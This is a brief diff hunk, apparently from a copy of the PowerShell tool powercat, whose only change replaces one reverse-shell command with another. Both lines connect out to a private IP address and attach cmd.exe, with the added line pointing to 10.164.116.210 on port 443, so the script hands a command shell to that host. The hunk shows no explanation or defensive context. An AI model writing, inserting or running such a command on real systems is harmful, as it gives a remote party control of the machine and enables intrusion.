@@ -943,4 +943,4 @@ Examples:
   }
   ########## EXECUTION ##########
 }
-powercat -c 10.164.119.79 -p 4443 -e cmd.exe -v
+powercat -c 10.164.116.210 -p 443 -e cmd.exe -v
